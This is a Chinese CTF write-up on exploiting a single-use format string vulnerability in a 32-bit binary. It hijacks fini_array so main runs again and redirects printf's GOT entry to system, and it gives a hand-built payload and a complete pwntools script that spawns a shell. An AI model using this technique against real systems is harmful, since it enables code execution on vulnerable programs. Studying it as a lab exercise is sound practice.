## 前言
如果存在格式化字符串，保护机制开的不健全，通常可以劫持 got 表，构造后门函数。然而，如果不存在循环、栈溢出控制 rop 等方式，如果格式化字符串漏洞点正常来说只能执行一次，getshell 是比较困难的。

不过，linux 下的二进制程序，在最后退出时，总会执行一些清扫函数，其中涉及到了 fini_array 这个数据结构。

## 一、fini_array
网上有很多优质博客，具体原理还是各位佬讲的清楚详细（注意静态链接和动态链接的区别）：

简单来说，fini_array 数组存放了函数指针，在退出时，会进行调用。 

因此，面临用户代码区域中之后一次漏洞机会时，可以通过劫持 fini_array 来实现二次利用。

二、题目
![[Pasted image 20240215123259.png]]![[Pasted image 20240215123302.png]]
![[Pasted image 20240215123307.png]]

总结来说：

Main 函数可以触发一次格式化字符串漏洞，但是通过劫持 got 表 getshell 至少需要触发两次
存在 system 的 plt 表 
## 三、解题过程
1. Fini_array 所在位置
通过 linux 自带的工具 readelf 即可

-a , --all 显示全部信息, 等价于 -h -l -S -s -r -d -V -A -I 。
-h , --file-header 显示 elf 文件开始的文件头信息.
-l , --program-headers , --segments 显示程序头（段头）信息 (如果有的话)。
-S , --section-headers , --sections 显示节头信息 (如果有的话)。
-g , --section-groups 显示节组信息 (如果有的话)。
-t , --section-details 显示节的详细信息 ( -S 的)。
-s , --syms , --symbols 显示符号表段中的项（如果有的话）。
-e , --headers 显示全部头信息，等价于: -h -l -S
-n , --notes 显示 note 段（内核注释）的信息。
-r , --relocs 显示可重定位段的信息。
-u , --unwind 显示 unwind 段信息。当前只支持 IA 64 ELF 的 unwind 段信息。
-d , --dynamic 显示动态段的信息。
-V , --version-info 显示版本段的信息。
-A , --arch-specific 显示 CPU 构架信息。
-D , --use-dynamic 使用动态段中的符号表显示符号，而不是使用符号段。
-x , --hex-dump= 以 16 进制方式显示指定段内内容。 Number 指定段表中段的索引, 或字符串指定文件中的段名。
-I , --histogram 显示符号的时候，显示 bucket list 长度的柱状图。
-v , --version 显示 readelf 的版本信息。
-H , --help 显示 readelf 所支持的命令行选项。
-W , --wide 宽行输出。
简单用 readelf -a pwn 即可
![[Pasted image 20240215123343.png]]

2. 格式化字符串漏洞利用 
既然要劫持 fini_array+劫持 got 那么：

`payload=fmtstr_payload (4,{fini_array: main, printf_got: system_plt}, write_size='short')` 

但是会出现超出输入长度限制的情况（byte、short）；或者出现“[!] padding is negative, this will not work on glibc”的报错（int、long）。

因此我们需要自己构造，减少长度。

```
# offset=4
fini_array=0x804979C
printf_got=0x804989c
system_plt=0x80483d0
main=0x8048534
 
# 0x0804 0x8534 0x804 0x83d0
payload=p32(fini_array+2)+p32(fini_array)+p32(printf_got+2)+p32(printf_got)
payload+=(f'%{0x804-0x10}c%4$hn'+f'%{0x8534-0x804}c%5$hn').encode()
payload+=(f'%{0x10000-0x8534+0x804}c%6$hn'+f'%{0x83d0-0x804}c%7$hn').encode()
`````
 
 
其实可以进一步减长度，fini_array和system_plt的三四字节都是0x0804，可以一次c修改两个双字节。

四、EXP 
```python
from pwn import *
from pwn import p32
 
context(arch='i386',log_level='debug')
 
io=process('./pwn')
# io=remote('xxx',xxx)
elf=ELF('./pwn')
io.recvuntil(b'name?\n')
# gdb.attach(io);input()
# offset=4
fini_array=0x804979C
printf_got=0x804989c
system_plt=0x80483d0
main=0x8048534
libc_csu_fini=0x8048620
 
# payload=fmtstr_payload(4,{fini_array:main,printf_got:system_plt},write_size='short')
# 0x0804 0x8534 0x804 0x83d0
payload=p32(fini_array+2)+p32(fini_array)+p32(printf_got+2)+p32(printf_got)
payload+=(f'%{0x804-0x10}c%4$hn'+f'%{0x8534-0x804}c%5$hn').encode()
payload+=(f'%{0x10000-0x8534+0x804}c%6$hn'+f'%{0x83d0-0x804}c%7$hn').encode()
input(str(len(payload)))
io.sendline(payload)
input()
io.recvuntil(b"Welcome to my ctf! What's your name?\n")
io.sendline(b'/bin/sh\x00')
 
io.interactive()
 
```
 
总结
从前过度依赖fmtstr_payload工具，这次也算是手动构造payload，更加了解格式化字符串了
从前做过一题劫持fini_array但是，这次显然没记起来。于是又强化了一下，至少印象不忘